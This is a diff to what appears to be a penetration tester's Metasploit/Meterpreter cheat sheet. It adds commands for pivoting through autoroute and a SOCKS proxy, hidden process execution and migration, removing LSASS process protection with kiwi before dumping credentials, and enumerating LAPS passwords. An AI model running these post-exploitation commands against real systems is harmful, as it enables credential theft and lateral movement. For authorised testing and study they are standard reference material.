@@ -20,14 +20,27 @@ sessions -l
 route print
 ```
 
-## add pivot
+## add pivot (autoroute)
 #plateform/linux #target/remote #cat/PIVOT/TUNNEL-PORTFW 
+exemple : 
+use multi/manage/autoroute
+set session 1
+exploit
 ```
 use multi/manage/autoroute
 ```
 
-## add socks proxy
+## add socks proxy (autoroute first)
 #plateform/linux #target/remote #cat/PIVOT/TUNNEL-PORTFW 
+
+exemple : 
+use multi/manage/autoroute
+set session 1
+exploit
+use auxiliary/server/socks_proxy
+set srvhost 127.0.0.1
+exploit -j
+
 ```
 use auxiliary/server/socks_proxy
 ```
@@ -43,3 +56,29 @@ load incognito
 ```
 impersonate_token <domain>\\<user>
 ```
+## create process
+#plateform/linux #target/local #cat/UTILS 
+```
+execute -H -f <process|notepad>
+```
+
+## migrate with name
+#plateform/linux #target/local #cat/ATTACK/INJECTION 
+```
+migrate -N <process_name|notepad.exe>
+```
+
+##  PPL remove
+#plateform/linux #target/local #cat/ATTACK/INJECTION 
+```
+load kiwi
+kiwi_cmd "!processprotect /process:lsass.exe /remove"
+creds_all
+```
+
+## enum LAPS
+#plateform/linux #target/local #cat/ATTACK
+```
+use post/windows/gather/credentials/enum_laps
+```
+
